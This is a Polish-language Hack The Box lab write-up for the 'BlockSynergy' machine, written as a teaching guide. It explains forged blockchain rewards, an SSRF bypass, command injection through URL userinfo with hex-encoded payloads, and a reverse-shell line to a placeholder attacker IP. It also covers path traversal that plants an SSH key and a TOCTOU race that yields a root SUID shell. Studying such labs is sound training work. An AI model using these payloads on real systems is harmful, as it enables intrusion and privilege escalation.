# BlockSynergy — HTB Write-up

**Author:** DonMorpheus (lab) + Ania  
**Machine:** BlockSynergy (Linux, tournament / Insane)  
**Stack:** Flask/Werkzeug 3.1.3 · Python 3.12.3 · Ubuntu 24.04  
**Scope:** HTB VPN / personal lab only  

> **Bez flag** i **bez żywych kluczy**. Placeholdery: `<TARGET_IP>`, `<TUN0_IP>`.

Ten dokument jest podręcznikiem **mechanizmów**. Kroki `exploit.py` / `race_watcher.py` są na końcu każdej fazy; najpierw *dlaczego to działa*.

---

## TL;DR

| Faza | Wektor |
|------|--------|
| Recon | Zewnątrz tylko **22** i **8080**. Wewnątrz Flask **`:5000`** (localhost). |
| VIP | Fałszywe TX `sender=Blockchain_Reward` + `signature=Blockchain`, mine **5 TX**, ≥10 coinów. Pole TX: **`receiver`**. |
| SSRF | VIP register noda. Filtr tnie `127` / `localhost` / hostname boxa. Bypass: **`0.0.0.0`**. `test_node` = **`requests.get`**. |
| Foothold `walter` | Admin `ping_node`: `os.system("ping -w 4 " + userinfo)`. Trigger to **GET z query** przez SSRF, nie POST z Kali. |
| Lateral `hank` | Contract engine `:5000`, `__meta__.log_file` bez sanityzacji → `authorized_keys`. |
| Root | Daemon restore jako root: SHA256, potem `tar xvf` tej samej ścieżki. TOCTOU + `inotify` + `rename`. |

---

## 0. Co ten box *udaje*, a co naprawdę jest bugiem

Aplikacja na `:8080` to dashboard blockchaina (wallet, mine, VIP, „node management”).  
VIP ma wyglądać jak federacja nodów. W praktyce `test_node/<id>` robi:

```text
requests.get(zarejestrowany_url)
```

User-Agent: `python-requests/2.32.5`, puste body, **zawsze GET**.  
POST / PUT / PATCH z Kali na `test_node` **nie** zmienia outbound metody (405 albo nadal GET).

Admin panel (`/admin/...`) z Kali = **403**, wyjątek: **`/admin/nodes/add_node` jest unauth**.  
Nie myl tego z pingiem. `add_node` tylko dopisuje URL do globalnej listy `GET /nodes`.

Ping RCE siedzi w **localhost-only** handlerze `/admin/nodes/manage`.

---

## 1. Recon

```bash
nmap -sC -sV -p- <TARGET_IP>
# 22/tcp  OpenSSH 9.6p1 Ubuntu
# 8080/tcp Werkzeug/3.1.3 Python/3.12.3
```

Pełny TCP z zewnątrz: tylko te dwa. `:5000` z Kali = `connection refused`.  
Skan SSRF (`http://0.0.0.0:<port>/`, **pomiń 8080** — self-GET potrafi zablokować single-thread Flask): jedyny hit to **5000**.

---

## 2. Wallet → VIP (fałszywy reward)

### 2.1 Wallet

```http
POST /dashboard/wallet
Content-Type: multipart/form-data
action=create   filename=pwn      → JSON {public_key, private_key} (download)
action=load     file=@wallet.json → sesja Flask
```

Pole pliku to **`file`**, nie `wallet_file`.  
Create **nie** ładuje sesji — bez `load` dashboard nie widzi portfela.

VIP wymaga **≥ 10 coinów**. Nowy wallet ma 0.

### 2.2 Forge

```http
POST /broadcast_transaction
Content-Type: application/json

{"sender":"Blockchain_Reward","receiver":"<PUB>","amount":20,"signature":"Blockchain"}
```

Aplikacja ufa `sender=Blockchain_Reward` + `signature=Blockchain` jak mintowi.  
**Nazwa pola odbiorcy to `receiver`.** `recipient` wejdzie na chain i później Python zrobi `tx['receiver']` → `KeyError` → VIP pages **500** dla każdego załadowanego walletu. Nie powtarzać.

Inni gracze na turnieju też forgują — `pending_transactions` jest globalne.

### 2.3 Mine

Hash bloku (dokładnie tak):

```text
sha256( str(index) + str(previous_hash) + str(timestamp) + json.dumps(data) + str(nonce) )
```

- `index` = `last.index + 1`
- `previous_hash` = `last.hash`
- `data` = **pierwsze 5** pending (FIFO), albo *twoje* 5 TX wrzucone na początek listy (żeby nie zjeść cudzych)
- `timestamp` = UTC, **późniejszy** niż last block; inaczej `Not Added!`
- difficulty: prefix **`00000`**

`GET /mining_data` daje `blockchain`, `pending_transactions`, `difficulty`, `latest_block`.  
Nie bierz `time.time()` jako timestamp bez porównania z last — strefa Kali vs UTC psuje mine.

Po `Added!` znowu `load` wallet i `/dashboard/vip/nodes` — ma być formularz `action=register`, bez `Permission Denied`.

Publiczny `/dashboard/vip/smart_contracts` to **stub** „Coming soon…”. To nie jest `:5000`.

---

## 3. SSRF (VIP nodes)

```http
POST /dashboard/vip/nodes
action=register&node=http://0.0.0.0:8080/admin/nodes/manage
GET  /dashboard/vip/nodes/test_node/<i>
GET  /nodes     → JSON lista URL (globalna; index = i)
```

`i` w HTML: `onclick="testNode('0')"` **z cudzysłowem**.

### 3.1 Filtr localhost

Odrzuca m.in. `127.0.0.1`, `localhost`, `127.1`, hostname boxa (`blocksynergy`), `127.0.1.1`.  
**`0.0.0.0` przechodzi** i nadal łączy się z lokalnym listenerem.

`file://`, `gopher://`, `dict://`: register czasem 200, `test_node` = „Node not reachable” (`requests` nie ma adaptera gopher).

### 3.2 Dlaczego GET-only SSRF nie POST-uje

- `test_node` = `requests.get`.
- 307 z twojego serwera: follow **zachowuje GET**, bo pierwszy request był GET.
- Self-307 na `0.0.0.0:8080/admin/nodes/manage` (bez query) potrafi **zawiesić Flask**.

Nie ma tu gopher-POST. Trigger pinga jest inny (sekcja 4).

`GET /nodes` bywa **czyszczona** co jakiś czas. Rejestruj A+B i strzelaj `test_node` w pętli (jak `exploit.py`).

Unauth `POST /admin/nodes/add_node` dopisuje do tej samej listy. Po **udanym mine** box robi `requests.get` na każdy URL z `/nodes` (puste body) — znowu GET, nie ping.

---

## 4. Foothold `walter` — ping CI

### 4.1 Rdzeń buga

Handler `ping_node` skleja i odpala przez shell:

```text
ping -w 4 <userinfo_z_URL>
```

`urlparse` waliduje **hostname**. Userinfo leci prosto do shella.

```text
http://x;id;a@0.0.0.0:8080/
         ^^^^^^^ userinfo          ^^^^^^^ hostname (omija blocklistę)
```

Shell widzi:

```text
ping -w 4 x;id;a@0.0.0.0:8080
          │  │ └ śmieć
          │  └ id  (RCE)
          └ ping na host "x" (fail)
```

W `<pre>` na manage: `ping: invalid argument: '4x'`, potem `uid=1000(walter)`, potem `/bin/sh: a@0.0.0.0: not found`.

Użytkownik to **`walter`** (`uid=1000`). App cwd: `/opt/blocksynergy`.

### 4.2 Ograniczenia payloadu

| Zakaz | Dlaczego | Obejście |
|-------|----------|----------|
| `/` | kończy netloc, hostname się sypie | hex + `xxd -r -p` |
| spacja | urlparse / ping | `${IFS}` |
| dodatkowy `:` w userinfo | port | nie używać `connect(("ip",port))` z dwukropkiem w URL |

Wrapper **bez** `/` i spacji:

```text
echo${IFS}<hex>|xxd${IFS}-r${IFS}-p|sh
```

Hexujesz *właściwą* komendę (`bash -i >& /dev/tcp/<TUN0_IP>/<PORT> 0>&1` albo `cat /home/walter/user.txt`).

Prefiks `x;` i suffix `;a` są celowe: `ping -w 4 x` dostaje argument, `;cmd;` odpala się jako kolejna komenda.

### 4.3 Trigger — to jest kawałek, który gubi GET-only SSRF

Ping **nie** idzie z POST-a z Kali (403, też z `X-Forwarded-For: 127.0.0.1`).  
GET `?action=ping_node` z Kali = 403.

Flask na **localhost** czyta query. Więc:

1. **A** = złośliwy URL (`http://x;<cmd>;a@0.0.0.0:8080/`)
2. **B** = `http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=<urlencoded A>`
3. `test_node(B)` → box sam robi GET B → localhost admin dostaje `action` + `target` → `ping` na userinfo A.

`target=` musi być **urlencoded** (`quote(..., safe="")`), bo A zawiera `;` i `@`.

Indeks B: `GET /nodes` → `.index(B)` → `test_node/<i>`.

Proof: `fire("id")`, output z `<pre>` przy węźle A.

Revshell:

```text
setsid${IFS}bash${IFS}-c${IFS}'bash -i >& /dev/tcp/<TUN0_IP>/<PORT> 0>&1'${IFS}&
```

…i to **hex-wrap**. Listener: `nc -lvnp 4444`.

Flaga user: `/home/walter/user.txt` (też da się `hex_wrap("cat /home/walter/user.txt")` bez interaktywnego shella).

```bash
python3 scripts/exploit.py <TARGET_IP> <TUN0_IP> 4444
```

---

## 5. Lateral `walter` → `hank` (`:5000`)

Internal **Smart Contract Development Server**, `127.0.0.1:5000` (default `flask run`).  
Z Kali refused. Z waltera: `ss -tlnp | grep 5000`.

`GET /` → 302 `/dashboard`. Upload:

```http
POST /dashboard
multipart: action=upload_contract  contract_file=@contract.json
```

Claim:

```http
POST /dashboard
application/x-www-form-urlencoded: action=contract_claim
```

### 5.1 Debug hook

Przy `"debug": "True"` i `"hooks": {"on_claim": "log"}` silnik zrzuca log do ścieżki z JSON **bez canonicalizacji**:

```json
"__meta__": {
  "log_file": "../../../../home/hank/.ssh/authorized_keys",
  "log_content": {"on_claim": "\nssh-ed25519 AAAA... comment"}
}
```

`../` wychodzi z katalogu uploadów do `/home/hank/.ssh/authorized_keys`.  
Walter **nie** listuje tego katalogu (brak r-x) — sukces sprawdzasz **SSH z Kali**.

Na Kali:

```bash
ssh-keygen -t ed25519 -f hank_key -N ""
python3 scripts/plant_hank.py hank_key.pub > contract.json
# wrzuć JSON na boxa, curl jak w scripts/README.md
ssh -i hank_key hank@<TARGET_IP>
```

`hank` jest w grupie **`developers`**.

---

## 6. Root — restore TOCTOU

### 6.1 Model daemona (root)

1. Widzi plik **`/opt/blocksynergy/restore`** (hank może `touch` — katalog `rwx` dla `developers`).
2. Ściąga *zaufane* archiwum do `/var/restore_work/_opt_blocksynergy.tar.gz`.
3. `sha256sum` (read-only fd).
4. Otwiera **tę samą ścieżkę jeszcze raz** i `tar xvf … -C /` jako **root**.

Między (3) a (4) jest okno. `IN_CLOSE_NOWRITE` (0x10) = sha256 zamknął fd. Wtedy `os.rename(payload, _opt_blocksynergy.tar.gz)` — **atomowy swap na tym samym FS**.

`/tmp` i `/var/restore_work` na tej maszynie są na jednym LV. Gdyby `EXDEV`, skopiuj payload do `/var/restore_work/`.

### 6.2 Payload

```bash
bash scripts/make_suid_tar.sh
# oczekujesz:
# -rwsr-xr-x root/root … opt/blocksynergy/.diag
```

`--transform` zmienia nazwę członka archiwum na `opt/blocksynergy/.diag`, `--mode=4755` `--owner=0`.

### 6.3 Race

```bash
python3 scripts/race_watcher.py &   # NAJPIERW watcher
touch /opt/blocksynergy/restore
```

Czekaj na `[+] swapped!`. Cykl ~minuty. Daemon **zjada** trigger — jak swap nie wpadł, znowu `touch`.

```bash
ls -l /opt/blocksynergy/.diag
# -rwsr-xr-x 1 root root …
/opt/blocksynergy/.diag -p
# uid=hank  euid=0(root)
cat /root/root.txt
```

**`-p` zostawia euid 0.** Bez `-p` bash zrzuca SUID.

FTP / hasło z backup joba **nie jest potrzebne** — daemon sam ciągnie trusted tar.

---

## 7. Ślepe zaułki (żeby nie wracać)

| Pomysł | Fakt |
|--------|------|
| POST ping z Kali / XFF / Host localhost | 403 |
| `gopher://` POST na `:5000` | `requests` nie mówi gopherem |
| VIP `/smart_contracts` upload | stub Coming soon |
| `download_app` | toast Currently unavailable |
| JWT w cookie | 32-bajtowa sesja Flask |
| `test_node` POST multipart na `:5000` | outbound nadal GET |
| SSH spray na `walter` | denied; wejście to cmdi, nie hasło |

---

## 8. Ćwiczenia (rozebrać razem, bez spiny)

1. Narysuj, co `urlparse` robi z `http://x;id;a@0.0.0.0:8080/` (scheme, userinfo, hostname, port, path).
2. Dlaczego `http://;id;@0.0.0.0/` *też* działa przy POST targecie, a writeup i tak wstawia `x;` i `;a`?
3. Zapisz `ping -w 4 x;id;a@0.0.0.0:8080` jako trzy komendy shella.
4. Czemu GET `?action=ping_node` z **Kali** nie strzela, a ten sam URL przez `test_node` strzela?
5. Zrób hex_wrap ręcznie dla `id` i dla `cat /etc/passwd` — gdzie pojawia się `/`?
6. Czemu `recipient` psuje VIP, a `receiver` nie?
7. Skąd 5 TX i FIFO vs „wpychamy nasze na początek”?
8. Ile `../` w `log_file` i od jakiego cwd to liczyć (nie znamy cwd z zewnątrz — skąd pewność, że 4× `../` trafia w `/home/hank`)?
9. `IN_CLOSE_NOWRITE` vs `IN_CLOSE_WRITE` — który fd zamyka `sha256sum` i czemu nie czekamy na `OPEN` tar?
10. Po co `-p` w SUID bash?

Odpowiedzi rozbieramy na głos. Skrypty nie zastępują tego.

---

## Replay (skrót)

```bash
# Kali
nc -lvnp 4444
python3 scripts/exploit.py <TARGET_IP> <TUN0_IP> 4444

ssh-keygen -t ed25519 -f hank_key -N ""
python3 scripts/plant_hank.py hank_key.pub > contract.json
# …upload+claim z shella waltera na 127.0.0.1:5000/dashboard

ssh -i hank_key hank@<TARGET_IP>
bash scripts/make_suid_tar.sh
python3 scripts/race_watcher.py &
touch /opt/blocksynergy/restore
/opt/blocksynergy/.diag -p
```
